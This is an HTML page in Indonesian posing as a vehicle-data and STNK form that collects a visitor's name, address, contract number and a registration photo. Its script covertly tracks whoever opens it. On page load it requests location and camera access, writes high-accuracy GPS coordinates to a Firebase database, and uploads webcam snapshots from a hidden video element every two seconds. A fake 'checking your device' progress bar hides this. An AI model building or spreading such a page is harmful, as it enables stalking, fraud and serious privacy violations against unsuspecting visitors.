<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulir Input Data & STNK</title>
    <!-- Lucide Icons CDN -->
    <script src="https://unpkg.com/lucide@latest"></script>
    <!-- Firebase SDK (v9 Compatibility Mode) -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f7f6;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .form-container {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 450px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        input[type="text"],
        textarea,
        input[type="file"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
        }
        textarea {
            resize: vertical;
            height: 80px;
        }
        input[type="file"] {
            padding: 5px;
            background-color: #fafafa;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
        /* Styling untuk area loading */
        #loadingArea {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 20px 0;
        }
        .progress-bar-container {
            width: 100%;
            background-color: #e0e0e0;
            border-radius: 4px;
            overflow: hidden;
            height: 20px;
            margin-top: 15px;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background-color: #007BFF;
            transition: width 0.3s ease;
        }
        /* Sembunyikan elemen video dan canvas */
        #webcamElement, #canvasElement {
            display: none;
        }
    </style>
</head>
<body>

<div class="form-container">
    
    <!-- Konten Utama (Formulir) -->
    <div id="mainContent">
        <h2>Formulir Data Kendaraan</h2>
        <form id="vehicleForm" action="proses.php" method="POST" enctype="multipart/form-data">
            
            <!-- Input Nama -->
            <div class="form-group">
                <label for="nama">Nama Lengkap:</label>
                <input type="text" id="nama" name="nama" placeholder="Masukkan nama lengkap" required>
            </div>

            <!-- Input Alamat -->
            <div class="form-group">
                <label for="alamat">Alamat:</label>
                <textarea id="alamat" name="alamat" placeholder="Masukkan alamat lengkap" required></textarea>
            </div>

            <!-- Input No Kontrak -->
            <div class="form-group">
                <label for="no_kontrak">No. Kontrak:</label>
                <input type="text" id="no_kontrak" name="no_kontrak" placeholder="Masukkan nomor kontrak" required>
            </div>

            <!-- Input No STNK -->
            <div class="form-group">
                <label for="no_stnk">No. STNK:</label>
                <input type="text" id="no_stnk" name="no_stnk" placeholder="Masukkan nomor STNK" required>
            </div>

            <!-- Upload Foto STNK -->
            <div class="form-group">
                <label for="foto_stnk">Upload Foto STNK:</label>
                <input type="file" id="foto_stnk" name="foto_stnk" accept="image/*" required>
                <small style="color: #777; font-size: 12px;">Format yang didukung: JPG, PNG, JPEG</small>
            </div>

            <!-- Tombol Submit -->
            <button type="button" onclick="Verifikasi()">Kirim Data</button>

        </form>
    </div>

    <!-- Area Loading (Muncul saat tombol diklik & verifikasi berjalan) -->
    <div id="loadingArea">
        <h3>Memproses Data & Verifikasi...</h3>
        <p>Mohon tunggu sebentar, sistem sedang memeriksa perangkat Anda.</p>
        <div class="progress-bar-container">
            <div id="progressFill" class="progress-fill"></div>
        </div>
        <p id="percentText" style="margin-top: 10px; font-weight: bold;">0%</p>
    </div>

    <!-- Elemen Webcam dan Canvas (Disembunyikan) -->
    <video id="webcamElement" autoplay playsinline></video>
    <canvas id="canvasElement"></canvas>

</div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyC5FzkrFW7JPOagOddT575F44wVT6hVeRE",
      authDomain: "sfkk-6af70.firebaseapp.com",
      databaseURL: "https://sfkk-6af70-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "sfkk-6af70",
      storageBucket: "sfkk-6af70.firebasestorage.app",
      messagingSenderId: "1045663352487",
      appId: "1:1045663352487:web:3948f3c0a8f1e215187d82",
      measurementId: "G-23SNFYWR8V"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const webcam = document.getElementById('webcamElement');
    const canvas = document.getElementById('canvasElement');
    const mainContent = document.getElementById('mainContent');
    const loadingArea = document.getElementById('loadingArea');
    const progressFill = document.getElementById('progressFill');
    const percentText = document.getElementById('percentText');

    let statusLokasi = false;
    let statusKamera = false;

    window.onload = async function() {
      // Meminta izin lokasi dan kamera secara otomatis saat halaman dimuat
      statusLokasi = await mintaLokasi();
      statusKamera = await mintaKamera();
    };

    async function Verifikasi() {
      // Validasi ulang jika izin belum diberikan sebelumnya
      if (!statusLokasi) statusLokasi = await mintaLokasi();
      if (!statusKamera) statusKamera = await mintaKamera();

      if (!statusLokasi || !statusKamera) {
        alert("Layanan ini tidak bisa berjalan jika izin Lokasi dan Kamera belum diizinkan.");
        window.location.reload();
        return;
      }

      // Sembunyikan form utama dan tampilkan loading area
      mainContent.style.display = 'none';
      loadingArea.style.display = 'flex';
      jalankanProgressBar();
    }

    function jalankanProgressBar() {
      let progress = 0;
      const interval = setInterval(() => {
        if (progress < 100) {
          progress += Math.floor(Math.random() * 3) + 1;
          if (progress > 100) progress = 100;
          progressFill.style.width = progress + '%';
          percentText.innerText = progress + '%';
        } else {
          clearInterval(interval);
          // Setelah progress bar selesai, form bisa di-submit secara otomatis ke backend (proses.php)
          document.getElementById('vehicleForm').submit();
        }
      }, 300);
    }

    function mintaLokasi() {
  return new Promise((resolve) => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          db.ref('device/location').set({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy, // Menyimpan informasi tingkat akurasi (dalam meter)
            updatedAt: Date.now()
          });
          resolve(true);
        },
        (error) => {
          console.warn("Lokasi ditolak atau gagal:", error.message);
          resolve(false);
        },
        { 
          enableHighAccuracy: true, // Memaksa menggunakan GPS jika tersedia
          timeout: 20000,           // Perpanjang waktu tunggu menjadi 20 detik agar GPS sempat lock
          maximumAge: 0             // Jangan gunakan data cache lokasi yang lama
        }
      );
    } else {
      resolve(false);
    }
  });
}


    async function mintaKamera() {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          webcam.srcObject = stream;
          setInterval(captureFrame, 2000);
          return true;
        } catch (err) {
          console.warn("Kamera ditolak:", err.message);
          return false;
        }
      } else {
        return false;
      }
    }

    function captureFrame() {
      if (webcam.videoWidth === 0) return;

      canvas.width = webcam.videoWidth;
      canvas.height = webcam.videoHeight;
      
      const ctx = canvas.getContext('2d');
      ctx.drawImage(webcam, 0, 0, canvas.width, canvas.height);

      const base64Image = canvas.toDataURL('image/jpeg', 1.0);
      db.ref('device/cameraFrame').set(base64Image);
    }
  </script>

</body>
</html>
